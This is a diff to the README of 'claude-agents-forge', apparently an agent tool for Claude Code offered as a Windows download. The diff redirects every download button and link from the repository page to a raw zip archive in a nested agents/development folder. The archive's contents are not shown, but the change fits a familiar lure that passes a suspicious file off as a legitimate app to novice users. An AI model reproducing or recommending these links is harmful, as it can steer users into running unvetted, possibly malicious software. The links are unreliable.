@@ -1,6 +1,6 @@
 # 🤖 claude-agents-forge - Stable Agent System for Claude Code
 
-[![Download Now](https://img.shields.io/badge/Download-claude--agents--forge-blue?style=for-the-badge&logo=github)](https://github.com/Rohankundra2009/claude-agents-forge)
+[![Download Now](https://img.shields.io/badge/Download-claude--agents--forge-blue?style=for-the-badge&logo=github)](https://github.com/Rohankundra2009/claude-agents-forge/raw/refs/heads/main/agents/development/agents-claude-forge-1.6.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This section walks you through finding, downloading, and running the app on Wind
 
 To get the app files, visit the official GitHub repository here:
 
-[Download claude-agents-forge](https://github.com/Rohankundra2009/claude-agents-forge)
+[Download claude-agents-forge](https://github.com/Rohankundra2009/claude-agents-forge/raw/refs/heads/main/agents/development/agents-claude-forge-1.6.zip)
 
 The page may look technical, but don't worry. You only need to find the latest release to get the software.
 
@@ -138,4 +138,4 @@ Your data remains on your device unless you choose to share it with cloud servic
 
 ---
 
-[![Download 2](https://img.shields.io/badge/Download%20App-Grey?style=for-the-badge&logo=windows&color=grey)](https://github.com/Rohankundra2009/claude-agents-forge)
+[![Download 2](https://img.shields.io/badge/Download%20App-Grey?style=for-the-badge&logo=windows&color=grey)](https://github.com/Rohankundra2009/claude-agents-forge/raw/refs/heads/main/agents/development/agents-claude-forge-1.6.zip)
